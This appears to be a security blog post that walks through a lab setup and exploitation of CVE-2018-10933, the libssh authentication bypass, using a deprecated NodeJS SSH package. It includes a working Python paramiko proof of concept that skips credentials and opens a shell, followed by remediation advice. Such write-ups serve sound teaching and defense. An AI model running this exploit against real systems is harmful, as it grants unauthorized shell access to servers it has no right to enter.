+++ 
draft = false
date = 2018-10-22T18:28:33+01:00
title = "Exploiting a NodeJS SSH Server with CVE-2018-10933"
slug = "Exploit-CVE-2018-10933-NodeJS" 
tags = ["CVE-2018-10933","CVE2018-10933","NodeJS","Node"]
categories = ["CVE","Node","NodeJS",""]
thumbnail = "<no value>"
description = "Exploiting a NodeJS SSH server with CVE-2018-10933"
+++

In the recent week <b>CVE-2018-10933</b> created a great deal of excitement online.  This a vulnerability in <b>'libssh'</b> before versions <b>0.7.6</b> and <b>0.8.4</b> which allows an attacker to circumvent SSH authentication. The public advisory issued by 'libssh' can be found [here](https://www.libssh.org/2018/10/16/libssh-0-8-4-and-0-7-6-security-and-bugfix-release/)

The full range of vulnerable products using libssh was still unclear when writing, however as a proof of concept the vulnerable and deprecated [NodeJS SSH server](https://www.npmjs.com/package/ssh) will be used in this blog. 

The Vulnerability
----
<b>Vulnerable Software:</b> libssh <0.7.6 and libssh <0.8.4

The vulnerability is quite simple conceptually. A server using the above versions of 'libssh' expect a <b>'SSH2_MSG_USERAUTH_REQUEST'</b> message during authentication. 

This bug occurs when we supply a message of <b>'SSH2_MSG_USERAUTH_SUCCESS'</b> in place of the above, after which the server will grant us access without requiring any credentials.

![xkcd](images/sandwich.jpg)

Surprisingly, no one has dubbed this issue 'Open Sesame'.



Lab Setup
----

[npm](https://docs.npmjs.com/getting-started/what-is-npm), the package manager for NodeJS is kind enough of containing a vulnerable SSH library which uses the affected libraries.  This Lab will be setup in a [scotch-box](https://github.com/scotch-io/scotch-box) vagrant image.

This package can be installed by using a provisioning script such as the following (this should also work on any Debian base with Node+npm installed):

```shell
#!/bin/bash

echo 'Installing n'
npm cache clean -f
npm install -g n

echo 'Installing Node 0.12.18'
n 0.12.18

echo 'Installing node-libssh'
npm i ssh

#Make our dummy code listen on all interfaces
sed -i.bak 's/127.0.0.1/0.0.0.0/g' /home/vagrant/node_modules/ssh/examples/ stdiopipe.js 
```


As part of our new install we already have a dummy SSH server we can execute. 

The 'stdiopipe.js' file contains a sample NodeJS SSH server, which will reply with a banner on succesfull authentication and spawning of a shell.  Here we can see how to run the server:

![libssh server](images/libsshd.png)

A succesful banner after authenticating with the appropriate credentials:

![nodejs ssh banner](images/ssh_banner.png)

A permission denied message if we fail to authenticate:

![access denied](images/ssh_banner_unauth.png)

That is all we need for our lab setup.

The Exploit
----
To exploit this issue we will perform the following actions using the 'paramiko' python library:

1. Connect to the server (in this case 192.168.33.10 on port 3333)
2. Send the 'SSH2_MSG_USERAUTH_SUCCESS' message to bypass authentication
3. Invoke a shell in the established SSH channel
4. Receive the banner sent when successfully authenticated with a shell to prove access.

```python
#!/usr/bin/env python

import socket
import paramiko
from paramiko import *

hostname="192.168.33.10"
port="3333"

try:
    sock = socket.create_connection((hostname, port))
    message = paramiko.message.Message()
    transport = paramiko.transport.Transport(sock)

    print "Attempting to start SSH client."
    transport.start_client()

    print "Sending USERAUTH_SUCCESS message."
    message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
    transport._send_message(message)

    print "Attempting to open an SSH session."
    channel = transport.open_session()

    print "Attempting to invoke a shell."
    channel.invoke_shell()

    print "Retrieving banner from successful shell invocation"
    print "Banner: ", channel.recv(100)
except Exception as e:
    print('SSH Exception: {}'.format(e))
    exit(1)
```

We will successfully achieve the authentication bypass and retrieve the banner, as shown below:

![libssh exploit](images/libsshd_exploit.png)

Remediation
----
'libssh' is a vulnerable component, rather than a vulnerable standalone piece of software in itself.  As such, identification of software using vulnerable versions of 'libssh' should be prioritised and updated to the fixed versions.

I've never come across someone who required NodeJS to deploy an SSH server, however if you are one of ***those people*** downloading and using the deprecated npm 'ssh' library, you should migrate to an up to date and supported package which will provide greater confidence in the authentication supplied.

